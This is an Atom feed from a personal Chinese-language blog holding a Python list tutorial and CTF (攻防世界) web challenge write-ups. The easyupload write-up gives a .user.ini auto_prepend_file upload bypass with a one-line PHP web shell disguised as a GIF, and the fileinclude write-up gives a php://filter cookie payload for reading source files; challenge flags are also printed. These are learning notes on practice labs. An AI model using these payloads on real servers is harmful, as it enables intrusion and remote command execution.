<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sinky&#39;s Blog</title>
  
  
  <link href="https://sinky.top/atom.xml" rel="self"/>
  
  <link href="https://sinky.top/"/>
  <updated>2022-08-18T11:43:37.093Z</updated>
  <id>https://sinky.top/</id>
  
  <author>
    <name>Sinky</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Python学习3</title>
    <link href="https://sinky.top/2022/08/18/python%E5%AD%A6%E4%B9%A03/"/>
    <id>https://sinky.top/2022/08/18/python%E5%AD%A6%E4%B9%A03/</id>
    <published>2022-08-18T10:07:24.521Z</published>
    <updated>2022-08-18T11:43:37.093Z</updated>
    
    <content type="html"><![CDATA[<h1 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h1><p>变量可以存储一个元素，而列表是可以存储多个元素，程序可以方便的对这些数据进行整体操作。</p><p>（相当于数组）</p><p>eg:</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">a</span>=10<br>list=[<span class="hljs-string">'hello'</span>,<span class="hljs-string">'world'</span>,98]<br><span class="hljs-built_in">print</span>(id(list)) # 2957481570240<br><span class="hljs-built_in">print</span>(type(list)) # &lt;class <span class="hljs-string">'list'</span>&gt;<br><span class="hljs-built_in">print</span>(list) # [<span class="hljs-string">'hello'</span>, <span class="hljs-string">'world'</span>, 98]<br></code></pre></td></tr></tbody></table></figure><h2 id="创建列表"><a href="#创建列表" class="headerlink" title="创建列表"></a>创建列表</h2><p>1、使用中括号[]，英文逗号分隔，调用内置函数list()</p><p>2、特点：</p><ul><li>有序排序</li><li>索引映射唯一一个数据</li><li>可存储重复数据</li><li>任意数据类型混存</li><li>根据需要动态分配和回收内存</li></ul><p>eg:</p><figure class="highlight prolog"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs prolog">list=[<span class="hljs-string">'hello'</span>,<span class="hljs-string">'world'</span>,<span class="hljs-number">98</span>] <br>print(list) # [<span class="hljs-string">'hello'</span>, <span class="hljs-string">'world'</span>, <span class="hljs-number">98</span>]<br>print(list[<span class="hljs-number">0</span>],list[<span class="hljs-number">-3</span>]) # hello hello<br></code></pre></td></tr></tbody></table></figure><h2 id="列表查询"><a href="#列表查询" class="headerlink" title="列表查询"></a>列表查询</h2><h3 id="获取指定元素索引-index"><a href="#获取指定元素索引-index" class="headerlink" title="获取指定元素索引 index()"></a>获取指定元素索引 <code>index()</code></h3><ul><li>列表中有相同元素，只返回第一个元素的索引</li><li>查询元素不存在返回error</li><li>可指定范围</li></ul><p>eg:</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">list=<span class="hljs-selector-attr">[<span class="hljs-string">'hello'</span>,<span class="hljs-string">'world'</span>,98,<span class="hljs-string">'hello'</span>]</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(list.index(<span class="hljs-string">'hello'</span>)</span></span>) #<span class="hljs-number">0</span><br> <span class="hljs-selector-id">#print</span>(list<span class="hljs-selector-class">.index</span>(<span class="hljs-string">'hello'</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>)) #<span class="hljs-string">'world'</span>,<span class="hljs-number">98</span>,范围内无<span class="hljs-string">'hello'</span>，返回error<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(list.index(<span class="hljs-string">'hello'</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>)</span></span>) #<span class="hljs-number">3</span><br></code></pre></td></tr></tbody></table></figure><h3 id="获取列表中的单个元素"><a href="#获取列表中的单个元素" class="headerlink" title="获取列表中的单个元素"></a>获取列表中的单个元素</h3><ul><li>正向，从0到n-1，eg:<code>list[0]</code></li><li>逆向，从-n到-1，eg:<code>list[-n]</code></li><li>不存在，error</li></ul><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">list=<span class="hljs-selector-attr">[<span class="hljs-string">'hello'</span>,<span class="hljs-string">'world'</span>,98,<span class="hljs-string">'hello'</span>,324]</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(list[<span class="hljs-number">2</span>])</span></span> #<span class="hljs-number">98</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(list[-<span class="hljs-number">3</span>])</span></span> #<span class="hljs-number">98</span><br> <span class="hljs-selector-id">#print</span>(list<span class="hljs-selector-attr">[-8]</span>) #error<br></code></pre></td></tr></tbody></table></figure><h3 id="获取列表中的多个元素"><a href="#获取列表中的多个元素" class="headerlink" title="获取列表中的多个元素"></a>获取列表中的多个元素</h3><p>列表名[start:stop:step]</p><p>eg:</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">list1</span>=[<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>,<span class="hljs-number">50</span>,<span class="hljs-number">60</span>,<span class="hljs-number">70</span>,<span class="hljs-number">80</span>]<br><span class="hljs-attribute">list2</span>=list1[<span class="hljs-number">1</span>:<span class="hljs-number">6</span>:<span class="hljs-number">1</span>]<br><span class="hljs-attribute">print</span>(list2) #<span class="hljs-meta"> [20, 30, 40, 50, 60]</span><br><span class="hljs-attribute">print</span>(list1[<span class="hljs-number">1</span>:<span class="hljs-number">6</span>])<br><span class="hljs-attribute">print</span>(list1[<span class="hljs-number">1</span>:<span class="hljs-number">6</span>:])<br><span class="hljs-attribute">print</span>(list1[<span class="hljs-number">1</span>:<span class="hljs-number">6</span>:<span class="hljs-number">2</span>]) #<span class="hljs-meta"> [20, 40, 60]</span><br><span class="hljs-attribute">print</span>(list1[:<span class="hljs-number">6</span>:<span class="hljs-number">2</span>]) #<span class="hljs-meta"> [10, 30, 50]</span><br> <span class="hljs-comment">#step为负数</span><br><span class="hljs-attribute">print</span>(list1[::-<span class="hljs-number">1</span>]) #<span class="hljs-meta"> [80, 70, 60, 50, 40, 30, 20, 10]</span><br><span class="hljs-attribute">print</span>(list1[<span class="hljs-number">7</span>::-<span class="hljs-number">1</span>]) #<span class="hljs-meta"> [80, 70, 60, 50, 40, 30, 20, 10]</span><br><span class="hljs-attribute">print</span>(list1[<span class="hljs-number">6</span>:<span class="hljs-number">0</span>:-<span class="hljs-number">2</span>]) #<span class="hljs-meta"> [70, 50, 30]</span><br></code></pre></td></tr></tbody></table></figure><h3 id="判断元素在列表中是否存在"><a href="#判断元素在列表中是否存在" class="headerlink" title="判断元素在列表中是否存在"></a>判断元素在列表中是否存在</h3><p><code>元素 in/not in 列表</code></p><p>列表元素的遍历：<code>for 迭代变量 in 列表名：  操作</code></p><p>eg: </p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">list=[10,20,<span class="hljs-string">'python'</span>,<span class="hljs-string">'hello'</span>]<br><span class="hljs-built_in">print</span>(10 <span class="hljs-keyword">in</span> list) # <span class="hljs-literal">True</span><br><span class="hljs-built_in">print</span>(100 <span class="hljs-keyword">in</span> list) # <span class="hljs-literal">False</span><br><span class="hljs-built_in">print</span>(10 <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> list) # <span class="hljs-literal">False</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> list:<br>    <span class="hljs-built_in">print</span>(i) #10 20 python hello<br></code></pre></td></tr></tbody></table></figure><h2 id="列表增加"><a href="#列表增加" class="headerlink" title="列表增加"></a>列表增加</h2><ul><li>append() 在列表末尾添加一个元素</li><li>extend() 在列表末尾至少添加一个元素</li><li>insert() 在列表任意位置添加一个位置</li><li>切片 在任意位置至少添加一个元素</li></ul><p>eg:</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros">list=[10,20,30]<br>list.append(100)<br><span class="hljs-built_in">print</span>(list) #[10,20,30,100]<br>list2=[<span class="hljs-string">'hello'</span>,<span class="hljs-string">'world'</span>]<br>list.append(list2)<br><span class="hljs-built_in">print</span>(list) # [10, 20, 30, 100, [<span class="hljs-string">'hello'</span>, <span class="hljs-string">'world'</span>]]<br>list.extend(list2)<br><span class="hljs-built_in">print</span>(list) # [10, 20, 30, 100, [<span class="hljs-string">'hello'</span>, <span class="hljs-string">'world'</span>], <span class="hljs-string">'hello'</span>, <span class="hljs-string">'world'</span>] <br>list.insert(1,90)<br><span class="hljs-built_in">print</span>(list) # [10, 90, 20, 30, 100, [<span class="hljs-string">'hello'</span>, <span class="hljs-string">'world'</span>], <span class="hljs-string">'hello'</span>, <span class="hljs-string">'world'</span>]<br>list3=[<span class="hljs-literal">True</span>,<span class="hljs-literal">False</span>,<span class="hljs-string">'hello'</span>]<br>list[1:]=list3<br><span class="hljs-built_in">print</span>(list) # [10, <span class="hljs-literal">True</span>, <span class="hljs-literal">False</span>, <span class="hljs-string">'hello'</span>]<br></code></pre></td></tr></tbody></table></figure><h2 id="列表删除"><a href="#列表删除" class="headerlink" title="列表删除"></a>列表删除</h2><ul><li>remove() 一次删一个；重复元素只删第一个；元素不存在返回error</li><li>pop() 删除一个指定索引位置上的元素；指定索引不存在返回error;不指定索引，删除列表中最后一个元素</li><li>切片 一次至少删除一个元素</li><li>clear() 清空列表</li><li>del 删除列表</li></ul><p>eg:</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs routeros">list=[10,20,30,40,50,60,30]<br>list.<span class="hljs-built_in">remove</span>(30)<br><span class="hljs-built_in">print</span>(list) # [10, 20, 40, 50, 60, 30]<br>list.pop()<br><span class="hljs-built_in">print</span>(list) # [10, 20, 40, 50, 60]<br>list.pop(1)<br><span class="hljs-built_in">print</span>(list) # [10, 40, 50, 60]<br><span class="hljs-attribute">new_list</span>=list[1:3]<br><span class="hljs-built_in">print</span>(list) # [10, 40, 50, 60]<br><span class="hljs-built_in">print</span>(new_list) # [40, 50]<br> #不产生新的列表，直接删除原列表内容<br>list[1:3]=[]<br><span class="hljs-built_in">print</span>(list) # [10, 60]<br>list.clear()<br><span class="hljs-built_in">print</span>(list) # []<br> #del 删除列表<br>del list<br><span class="hljs-built_in">print</span>(list)<br><span class="hljs-built_in">print</span>(list) # &lt;class <span class="hljs-string">'list'</span>&gt;<br></code></pre></td></tr></tbody></table></figure><h2 id="列表修改"><a href="#列表修改" class="headerlink" title="列表修改"></a>列表修改</h2><ul><li>为指定索引的元素赋予一个新值</li><li>为指定的切片赋予一个新值</li></ul><p>eg:</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">list</span>=[<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>]<br><span class="hljs-attribute">list</span>[<span class="hljs-number">2</span>]=<span class="hljs-number">100</span><br><span class="hljs-attribute">print</span>(list) #<span class="hljs-meta"> [10, 20, 100, 40]</span><br><span class="hljs-attribute">list</span>[<span class="hljs-number">1</span>:<span class="hljs-number">3</span>]=[<span class="hljs-number">300</span>,<span class="hljs-number">400</span>,<span class="hljs-number">500</span>]<br><span class="hljs-attribute">print</span>(list) #<span class="hljs-meta"> [10, 300, 400, 500, 40]</span><br></code></pre></td></tr></tbody></table></figure><h2 id="列表排序"><a href="#列表排序" class="headerlink" title="列表排序"></a>列表排序</h2><ul><li>调用sort(),列中所有元素默认按照从小到大顺序进行排序，可以指定reverse=True进行降序。</li><li>调用内置函数sorted(),可以指定reverse=True进行降序排序，原列表不发生变化（产生新列表）</li></ul><p>eg:</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">list=[20,40,10,98,45]<br>list.sort()<br><span class="hljs-built_in">print</span>(list) # [10, 20, 40, 45, 98]<br> #降序<br>list.sort(<span class="hljs-attribute">reverse</span>=<span class="hljs-literal">True</span>)<br><span class="hljs-built_in">print</span>(list) # [98, 45, 40, 20, 10]<br>list.sort(<span class="hljs-attribute">reverse</span>=<span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(list) # [10, 20, 40, 45, 98]<br></code></pre></td></tr></tbody></table></figure><p>eg:</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">list</span>=[<span class="hljs-number">20</span>,<span class="hljs-number">40</span>,<span class="hljs-number">10</span>,<span class="hljs-number">98</span>,<span class="hljs-number">45</span>]<br>new_list=<span class="hljs-built_in">sorted</span>(<span class="hljs-built_in">list</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>) <span class="hljs-comment"># [20, 40, 10, 98, 45]</span><br><span class="hljs-built_in">print</span>(new_list) <span class="hljs-comment"># [10, 20, 40, 45, 98]</span><br> <span class="hljs-comment">#降序</span><br>desc_list=<span class="hljs-built_in">sorted</span>(<span class="hljs-built_in">list</span>,reverse=<span class="hljs-literal">True</span>)<br><span class="hljs-built_in">print</span>(desc_list) <span class="hljs-comment"># [98, 45, 40, 20, 10]</span><br></code></pre></td></tr></tbody></table></figure><h2 id="列表生成式"><a href="#列表生成式" class="headerlink" title="列表生成式"></a>列表生成式</h2><p><code>[列表元素的表达式 for i in range(1,10)]</code></p><p>eg：</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">l</span>=[i for i in range(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>)]<br><span class="hljs-attribute">print</span>(l) #<span class="hljs-meta"> [1, 2, 3, 4, 5, 6, 7, 8, 9]</span><br><span class="hljs-attribute">l2</span>=[ i*<span class="hljs-number">2</span> for i in range(<span class="hljs-number">1</span>,<span class="hljs-number">6</span>)]<br><span class="hljs-attribute">print</span>(l2) #<span class="hljs-meta"> [2, 4, 6, 8, 10]</span><br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;列表&quot;&gt;&lt;a href=&quot;#列表&quot; class=&quot;headerlink&quot; title=&quot;列表&quot;&gt;&lt;/a&gt;列表&lt;/h1&gt;&lt;p&gt;变量可以存储一个元素，而列表是可以存储多个元素，程序可以方便的对这些数据进行整体操作。&lt;/p&gt;
&lt;p&gt;（相当于数组）&lt;/p&gt;
&lt;p&gt;eg:&lt;</summary>
      
    
    
    
    
    <category term="python" scheme="https://sinky.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界web-easyupload</title>
    <link href="https://sinky.top/2022/08/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb-easyupload/"/>
    <id>https://sinky.top/2022/08/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb-easyupload/</id>
    <published>2022-08-17T06:58:13.030Z</published>
    <updated>2022-08-17T15:07:24.305Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述:"></a>题目描述:</h1><p>一名合格的黑客眼中，所有的上传点都是开发者留下的后门</p><p><img src="https://s2.loli.net/2022/08/17/ixpUIAyNQBwCkO2.png" alt="图片.png"></p><p>上传文件后返回文件路径了。</p><p>尝试修改后缀为.php，上传失败。</p><p>新建一个txt文件，内容为：</p><figure class="highlight nginx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">GIF89a</span><br>abc.jpg<br></code></pre></td></tr></tbody></table></figure><p>然后文件名改成a.jpg</p><p>上传成功。</p><p><img src="https://s2.loli.net/2022/08/17/Yvi2QP7humpFBAw.png" alt="图片.png"></p><p>（注：我以为是带着jpg的头文件就可以用一句话木马了，结果蚁剑连着的时候数据为空，是我天真了，果断看官方wp）</p><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>利用文件上传漏洞点，通过绕过服务器的安全防护，达到getshell的目的，主要考察利用fastcgi的.user.ini特性进行任意命令执行</p><p>有关利用.usr.ini构建php后门，博文贴：</p><p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p><h2 id="绕过的点："><a href="#绕过的点：" class="headerlink" title="绕过的点："></a>绕过的点：</h2><ul><li>检查文件是否有php字符串<ul><li>可以利用段标签绕过，例如<code>&lt;?=phpinfo();?&gt;</code></li></ul></li><li>检查后缀中是否有htaccess或ph<ul><li>可以通过上传.user.ini以及正常jpg文件来进行getshell，在服务器中只要运用了fastcgi的服务器就能够利用该方式getshell，不论是apache或者ngnix或是其他服务器。这个文件是php.ini的补充文件，当网页访问的时候就会自动查看当前目录下是否有.user.ini，然后将其补充进php.ini,并作为cgi的启动项。</li><li>其中很多功能设置了只能php.ini配置，但是还是有一些危险的功能可以被我们控制，比如<code>auto+prepend_file</code></li></ul></li><li>检查文件头部信息<ul><li>绕过方式即在文件头部添加一个图片的文件头，比如<code>GIF89a</code></li></ul></li><li>文件MIME类型<ul><li>绕过方法即修改上传时的Content-Type</li></ul></li></ul><p>新建文件更名为.user.ini，内容为</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GIF89a<br><span class="hljs-attribute">auto_prepend_file</span>=a.jpg<br></code></pre></td></tr></tbody></table></figure><p>上传.user.ini，bp抓包，更改Content-Type为<code>image/jpg</code>,放包，显示上传成功。</p><p><img src="https://s2.loli.net/2022/08/17/eaqHKAEVGvypFcB.png" alt="图片.png"></p><p>新建文件更名为a.jpg，内容为</p><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">GIF89a<br><span class="hljs-meta">&lt;?</span>=<span class="hljs-keyword">system</span>(<span class="hljs-string">'cat /flag);?&gt;</span><br></code></pre></td></tr></tbody></table></figure><p>上传成功，蚁剑连接，找到flag:</p><p><img src="https://s2.loli.net/2022/08/17/ovweEJS9kI1NDZG.png" alt="图片.png"></p><p>不知道为什么，官方给的payload上传之后500报错，换了一个payload成功了：</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<br><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'cmd'</span>]);<span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></tbody></table></figure><p><img src="https://s2.loli.net/2022/08/17/mbTtcXO3wzKF8G6.png" alt="图片.png"></p><pre><code class="hljs">cyberpeace{6ed12a66909f053b9bc1799622c9ce7e}</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述:&quot;&gt;&lt;/a&gt;题目描述:&lt;/h1&gt;&lt;p&gt;一名合格的黑客眼中，所有的上传点都是开发者留下的后门&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://s2.loli.</summary>
      
    
    
    
    
    <category term="ctf" scheme="https://sinky.top/tags/ctf/"/>
    
    <category term="WEB" scheme="https://sinky.top/tags/WEB/"/>
    
    <category term="攻防世界" scheme="https://sinky.top/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    <category term="文件上传漏洞" scheme="https://sinky.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界web-fileinclude</title>
    <link href="https://sinky.top/2022/08/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb-fileinclude/"/>
    <id>https://sinky.top/2022/08/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb-fileinclude/</id>
    <published>2022-08-17T03:31:33.308Z</published>
    <updated>2022-08-17T04:41:04.152Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="https://s2.loli.net/2022/08/17/dhX79DGxo4rptkT.png" alt="图片.png"></p><p>题目告知flag在flag.php里，分析源代码：</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>( !<span class="hljs-title function_ invoke__">ini_get</span>(<span class="hljs-string">'display_errors'</span>) ) {<br>  <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">'display_errors'</span>, <span class="hljs-string">'On'</span>); <span class="hljs-comment"># 打开报错提示</span><br>  }<br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL); <span class="hljs-comment">#设置php的报错级别为所有的错误和警告，并返回当前级别</span><br><span class="hljs-variable">$lan</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">'language'</span>]; <span class="hljs-comment">#语言切换</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$lan</span>)<br>{<br>@<span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">"language"</span>,<span class="hljs-string">"english"</span>); <span class="hljs-comment"># setcookie向客户端发送跟一个Http cookie(由服务器发送到浏览器的变量)</span><br>@<span class="hljs-keyword">include</span>(<span class="hljs-string">"english.php"</span>); <span class="hljs-comment"># 导入语言包</span><br>}<br><span class="hljs-keyword">else</span><br>{<br>@<span class="hljs-keyword">include</span>(<span class="hljs-variable">$lan</span>.<span class="hljs-string">".php"</span>);<span class="hljs-comment"># 后缀.php</span><br>}<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">'index.php'</span>); <span class="hljs-comment"># index.php 读取到$x中</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$x</span>; <span class="hljs-comment">#输入x</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure><p>设置cookie-language，就可以执行<code>include($lan.".php")</code></p><p>用伪协议<code>php://filter</code>读取文件，格式为：<code>php://filter / [read|write =] 过滤器 / resource= 目标文件 </code></p><h2 id="过滤器的分类（及常见过滤器）"><a href="#过滤器的分类（及常见过滤器）" class="headerlink" title="过滤器的分类（及常见过滤器）"></a>过滤器的分类（及常见过滤器）</h2><p><code>php://filter</code>是一种元封装器，设计用于数据流打开时的筛选过滤应用，</p><ul><li>string filter(字符过滤器)<ul><li>string.rot13  (对字符串执行 ROT13 转换)<ul><li>例：<code>php://filter/string.rot13/resource=flag.php</code></li></ul></li><li>string.toupper (转大写)<ul><li>例：<code>php://filter/string.toupper/resource=flag.php</code></li></ul></li><li>string.tolower (转小写)</li><li>string.strip_tags (去除 HTML 和 PHP 标记，尝试返回给定的字符串 str 去除空字符、HTML 和 PHP 标记后的结果)<ul><li>例：<code>php://filter/string.strip_tags/resource=flag.php</code></li></ul></li></ul></li><li>conversion filter (转换过滤器)<ul><li>convert.base64-encode &amp; convert.base64-decode (base64加密 base64解密)<ul><li>例：<code>php://filter/convert.base64-encode/resource=flag.php</code></li></ul></li><li>convert.quoted-printable-encode &amp; convert.quoted-printable-decode(在字符串后加=0A,及恢复)</li></ul></li><li>compression filter(压缩过滤)<ul><li>zlib.deflate &amp; zlib.inflate(压缩 解压)<ul><li>例：<code>php://filter/zlib.deflate/resource=flag.php</code></li><li>例：<code>php://filter/zlib.inflate/resource=flag.php</code></li></ul></li><li>bzip2.compress &amp; bzip2.decompress(zip 压缩 解压)</li></ul></li><li>encryption filter(加密过滤器)</li></ul><blockquote><p>resource=&lt;要过滤的数据流&gt; ： 必须参数，指定了要筛选过滤的数据流</p><p>read=&lt;独链的筛选列表&gt; ： 可选参数，设定一个或多个过滤器名称，以管道符(/)分隔</p><p>write=&lt;写链的筛选列表&gt; ： 可选参数，设定一个或多个过滤器名称，以管道符(/)分隔</p><p>&lt;;两个链的筛选列表&gt; ： 任何没有以read=或write=做前缀的筛选器列表会视情况应用于读或写链</p></blockquote><p>payload：</p><pre><code class="hljs">`cookie：language=php://filter/convert.base64-encode/resource=flag</code></pre><p>bp抓包，把cookie改成payload,即可得到密文，base64解密即可，或者直接在网页端把cookie改了也行</p><p><img src="https://s2.loli.net/2022/08/17/91ciqRSd3XZpT52.png" alt="图片.png"></p><p>flag: </p><pre><code class="hljs">cyberpeace{771e511122aa7492d439ae469279c22e}</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2022/08/17/dhX79DGxo4rptkT.png&quot; alt=&quot;图片.</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://sinky.top/tags/CTF/"/>
    
    <category term="WEB" scheme="https://sinky.top/tags/WEB/"/>
    
    <category term="攻防世界" scheme="https://sinky.top/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界web-very_easy_sql</title>
    <link href="https://sinky.top/2022/08/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb-very_easy_sql%E6%9C%AA%E5%AE%8C%E6%88%90/"/>
    <id>https://sinky.top/2022/08/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb-very_easy_sql%E6%9C%AA%E5%AE%8C%E6%88%90/</id>
    <published>2022-08-17T03:00:36.731Z</published>
    <updated>2022-08-17T04:41:04.149Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述:"></a>题目描述:</h1><p>太简单了不描述了，给sql签个到吧</p><p><img src="https://s2.loli.net/2022/08/17/7eIHtGJviqkMPbW.png" alt="图片.png"></p><p>题目上说：非内部用户无法访问。</p><p>查看源代码，发现有个use.php文件：</p><p><img src="https://s2.loli.net/2022/08/17/86yfplcZIVDboBu.png" alt="图片.png"></p><p>不行，看大佬写的wp好难，看不懂，先放一放。</p><p><a href="https://blog.csdn.net/m0_48780534/article/details/126309908" title="大佬的博文wp">https://blog.csdn.net/m0_48780534/article/details/126309908</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述:&quot;&gt;&lt;/a&gt;题目描述:&lt;/h1&gt;&lt;p&gt;太简单了不描述了，给sql签个到吧&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2022/</summary>
      
    
    
    
    
    <category term="ctf" scheme="https://sinky.top/tags/ctf/"/>
    
